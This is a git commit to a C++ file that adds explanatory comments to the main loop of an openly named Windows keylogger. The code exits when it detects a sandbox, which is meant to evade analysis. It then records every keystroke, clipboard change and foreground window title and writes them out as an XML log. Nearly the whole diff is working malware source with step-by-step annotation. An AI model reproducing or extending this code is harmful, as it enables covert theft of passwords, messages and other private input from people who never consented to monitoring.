f272fec6c305deeefd1f57658322cc2d8e1d381c
Qu3b411 <19296119+Qu3b411@users.noreply.github.com>
2018-12-02 12:11:41 -0800

    Update main.cpp
    Documentation for the control flow of main,

--- main.cpp
+++ main.cpp
@@ -135,39 +135,122 @@ FORCEINLINE int grabclipboard()
 int main()
 {
 
+    /*
+        execute a check to see if we may be in a sandboxed environment,
+        the check relies on the number of processors running on the device
+        if this check fails then exit from the environment
+    */
     if(SandBoxDetection()) return SandBoxedInstance;
-
+    /*
+        display an xml header to generate the end document.
+    */
     cout << "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n";
+    /*
+        grab a handle to the foreground process.
+    */
     HWND CURRENTPROCEESS=GetForegroundWindow();
+    /*
+        initialize the foreground window.
+    */
     _USER_SHIFT_FOCUS(CURRENTPROCEESS);
-    int LastKeyStrokeLogged;
+    /*
+        declare a buffer to store keyboard states.
+    */
+    unsigned int LastKeyStrokeLogged;
+    /*
+        the main loop, capture key strokes indefinitely.
+    */
     while (1)
     {
+
+        /*
+            global flag that dictates the state of the keyboard buffer
+            if the keyboard buffer is not empty from a previous key
+            stroke then the program will fault
+        */
         gotchar=true;
+        /*
+            determine if the user has shifted focus to a new process
+        */
         if (CURRENTPROCEESS==GetForegroundWindow())
         {
-            GetAsyncKeyState(VK_SHIFT);// flush buffer;
+            /*
+                check to see if the value of the keyboard buffer is in one of two states
+                0, or 1, if so then the global key state buffer is not sanitary and should not
+                be trusted
+            */
             if (GetAsyncKeyState(LastKeyStrokeLogged)== AsyncKeyStateTest_0 or GetAsyncKeyState(LastKeyStrokeLogged)==AsyncKeyStateTest_1)
                 LastKeyStrokeLogged=1;
+                /*default failed buffers to a state of (1)*/
+
+            /*
+                increment an anonymous value starting at the "0" position of the ASCII table and increment to
+                "9".
+            */
             for (int x=StartAsciiDec; x<EndAsciiDec; x++)
+                /*
+                    log the key and check for encoding from shift key state.
+                    map secondary outputs as well for state.
+                */
                 LastKeyStrokeLogged=GrabKey(x,(char)x,_Char_Table[x-AsciiDecimalToBase],LastKeyStrokeLogged);
-
+            /*
+                increment an anonymous value starting at the "a" position of the ASCII table and increment to
+                "Z".
+            */
             for (int x=StartAsciiAlphebet; x<EndAsciiAlphebet;x++)
+                /*
+                    log the key and check for key case, finally send a secondary mapping so that shift
+                     can be toggled.
+                */
                 LastKeyStrokeLogged=GetKeyState(VK_CAPITAL)?GrabKey(x,x,(x+AsciiLowerToUpper),LastKeyStrokeLogged):GrabKey(x,x+AsciiLowerToUpper,x,LastKeyStrokeLogged);
-
+            /*
+                iterate over the function keys
+            */
             for (int x=StartFunctionKeys; x<EndFunctionKeys; x++)
+                /*
+                    log the intention justified by the function keys in a a character sequence that is likely not used
+                    by the end user.
+                */
                 LastKeyStrokeLogged=GrabFuncKey(MapFunctionVkeys[x].Key,MapFunctionVkeys[x].str,LastKeyStrokeLogged);
-
+            /*
+                iterate over the set of keys available on the keyboard, but with no linear mapping.
+            */
             for (int x=StartUnmapedKeys; x<EndUnmapedKeys; x++)
+                /*
+                    grab thous key states that are not linearly justified, also deliver to
+                    the function secondary key states that can be toggled via the shift key.
+                */
                 LastKeyStrokeLogged=GrabKey(VkKeyScanExA(MapUnmapedVkeys[x].Primary,GetKeyboardLayout(0)),MapUnmapedVkeys[x].Primary,MapUnmapedVkeys[x].Secondary,LastKeyStrokeLogged);
         }
         else
+        /*
+            if the users focus has shifted from the currently logged foreground window
+            then take steps to indicate the state change.
+        */
         {
+            /*
+                complete the xml statements that were previously initialized then
+                initialize a new process xml tag.
+            */
             cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t</Process>";
+            /*
+                get the current foreground window and store it in the CURRENTPROCESS.
+            */
             CURRENTPROCEESS=GetForegroundWindow();
+            /*
+                call to initialize tags and further process the foreground window.
+            */
             _USER_SHIFT_FOCUS(CURRENTPROCEESS);
         }
+        /*
+            checks for changes in the clipboard state.
+        */
         grabclipboard();
+        /*
+            it is common for titles to change in processes,especially in browsers.
+            this checks if the current foreground window has registered under a new
+            title.
+        */
         EnterEvent(CURRENTPROCEESS);
     }
     return 0;
